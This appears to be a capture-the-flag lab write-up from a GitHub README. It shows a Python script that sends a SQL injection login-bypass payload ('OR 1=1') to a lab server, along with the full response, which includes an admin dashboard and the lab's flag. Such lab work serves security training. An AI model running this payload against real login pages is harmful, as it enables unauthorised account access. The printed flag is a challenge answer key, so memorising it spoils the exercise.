# AI for Cyber Security Showcase

The first stage involves generating and using an exploit script around the key concept of SQL injection. 

<img width="1425" height="904" alt="image" src="https://github.com/user-attachments/assets/88d91903-e512-4c70-9662-aeaf649074f1" />

```
import requests

# Set up the login credentials
username = "alice' OR 1=1 -- -"
password = "test"

# URL to the vulnerable login page
url = "http://10.48.142.240:5000/login.php"

# Set up the payload (the input)
payload = {
    "username": username,
    "password": password
}

# Send a POST request to the login page with our payload
response = requests.post(url, data=payload)

# Print the response content
print("Response Status Code:", response.status_code)
print("\nResponse Headers:")
for header, value in response.headers.items():
    print(f"  {header}: {value}")
print("\nResponse Body:")
print(response.text)
```


```
PS C:\Users\pc\Desktop> python script.py
Response Status Code: 200

Response Headers:
  Date: Fri, 12 Dec 2025 11:52:55 GMT
  Server: Apache/2.4.65 (Debian)
  X-Powered-By: PHP/8.1.33
  Expires: Thu, 19 Nov 1981 08:52:00 GMT
  Cache-Control: no-store, no-cache, must-revalidate
  Pragma: no-cache
  Vary: Accept-Encoding
  Content-Encoding: gzip
  Content-Length: 540
  Keep-Alive: timeout=5, max=99
  Connection: Keep-Alive
  Content-Type: text/html; charset=UTF-8

Response Body:
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dashboard - SQLi Lab</title>
    <link href="assets/css/bootstrap.min.css" rel="stylesheet">
    <link href="assets/css/style.css" rel="stylesheet">
</head>
<body class="dashboard-body">
    <div class="dashboard-container">
        <div class="welcome-banner">
            <h1>Welcome, admin!</h1>
            <p>You have successfully logged in to the system.</p>
        </div>


        <div class="alert alert-success alert-dismissible fade show" role="alert">
            <h4 class="alert-heading">Exploit Successful!</h4>
            <hr>
            <p class="mb-0"><code>FLAG: THM{SQLI_EXPLOIT}</code></p>
            <button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>
        </div>

        <a href="logout.php" class="btn btn-danger">Logout</a>
    </div>

    <script src="assets/js/bootstrap.bundle.min.js"></script>
</body>
</html>
```


The last flag is obtained by completing stage 3 and 4 where we learn about log analysis

<img width="491" height="245" alt="image" src="https://github.com/user-attachments/assets/14d9cdbd-0ad4-426b-9af9-67905d29000f" />


<img width="1867" height="914" alt="image" src="https://github.com/user-attachments/assets/c1d335b0-901b-4fa4-9356-6197df17289d" />

